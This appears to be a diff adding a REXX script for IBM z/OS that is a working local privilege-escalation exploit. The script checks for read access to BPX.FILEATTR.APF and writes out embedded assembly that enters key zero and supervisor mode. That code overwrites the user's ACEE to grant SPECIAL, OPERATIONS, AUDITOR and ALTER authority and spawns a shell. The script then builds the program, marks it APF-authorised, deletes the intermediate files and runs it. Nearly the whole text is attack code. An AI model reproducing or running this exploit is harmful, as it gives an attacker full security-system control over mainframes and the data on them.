@@ -1,0 +1,85 @@
+/* REXX */
+
+W = OUTTRAP('APFFILE.')
+address tso "SR CLASS(FACILITY) mask(BPX.FILEATTR.APF)"
+W = OUTTRAP('OFF')
+
+if POS(ICH31005I,APFFILE.1) /= 0 then do
+  say "You dont have read on BPX.FILEATTR.APF"
+  say "Ending"
+  exit(0)
+end
+
+say "You have read on BPX.FILEATTR.APF"
+
+
+SOURCE.0 = 46
+SOURCE.1 = "       CSECT"
+SOURCE.2 = "       AMODE 31"
+SOURCE.3 = "       STM 14,12,12(13)"
+SOURCE.4 = "       BALR 12,0"
+SOURCE.5 = "       USING *,12"
+SOURCE.6 = "       ST 13,SAVE+4"
+SOURCE.7 = "       LA 13,SAVE"
+SOURCE.8 = "*"
+SOURCE.9 = "       MODESET KEY=ZERO,MODE=SUP"
+SOURCE.10 = "       L 5,X'224'           POINTER TO ASCB"
+SOURCE.11 = "       L 5,X'6C'(5)         POINTER TO ASXB"
+SOURCE.12 = "       L 5,X'C8'(5)         POINTER TO ACEE"
+SOURCE.13 = "       NI X'26'(5),X'00'"
+SOURCE.14 = "       OI X'26'(5),X'B1'    SPE + OPER + AUDITOR ATTR"
+SOURCE.15 = "       NI X'27'(5),X'00'"
+SOURCE.16 = "       OI X'27'(5),X'80'    ALTER ACCESS"
+SOURCE.17 = "*"
+SOURCE.18 = "*"
+SOURCE.19 = "* spawn a shell"
+SOURCE.20 = "*"
+SOURCE.21 = "         CALL  BPX1EXC,                                                X"
+SOURCE.22 = "               (EXCMDL,EXCMD,FULLZERO,FULLZERO,FULLZERO,               x"
+SOURCE.23 = "               FULLZERO,FULLZERO,FULLZERO,                             x"
+SOURCE.24 = "               FULLZERO,FULLZERO,                                      x"
+SOURCE.25 = "               RTN_VAL,RTN_COD,RSN_COD),VL,MF=(E,PLIST)"
+SOURCE.26 = "*"
+SOURCE.27 = "* clear and exit"
+SOURCE.28 = "*"
+SOURCE.29 = "       L 13,SAVE+4"
+SOURCE.30 = "       LM 14,12,12(13)"
+SOURCE.31 = "       XR 15,15"
+SOURCE.32 = "       BR 14"
+SOURCE.33 = "*"
+SOURCE.34 = "SAVE   DS 18F"
+SOURCE.35 = "       DS    0F"
+SOURCE.36 = "*"
+SOURCE.37 = "* BPX1EXC vars"
+SOURCE.38 = "*"
+SOURCE.39 = "EXCMD    DC    CL7'/bin/sh'       # command to exec"
+SOURCE.40 = "EXCMDL   DC    A(L'EXCMD)         # len of cmd to exec"
+SOURCE.41 = "FULLZERO DC    F'0'               # everything else"
+SOURCE.42 = "RTN_VAL  DS    F                  # return value"
+SOURCE.43 = "RTN_COD  DS    F                  # return code"
+SOURCE.44 = "RSN_COD  DS    F                  # reason code"
+SOURCE.45 = "PLIST    DS    13A"
+SOURCE.46 = "         END"
+
+exename = arg(1)
+if length(exename) == 0 then exename = 'aceesh'
+
+say "Creating Authorised Executable" exename
+
+fname = exename".s"
+objname = exename".o"
+
+address SYSCALL "writefile (fname) 700 SOURCE."
+
+
+"as  -o "objname fname
+"ld -b ""AC=1"" -S ""//'SYS1.CSSLIB'"" -o" exename objname
+"extattr +a "exename
+"rm" objname
+"rm" fname
+
+say "Running Authorised Executable" exename
+"./"exename
+
+
+
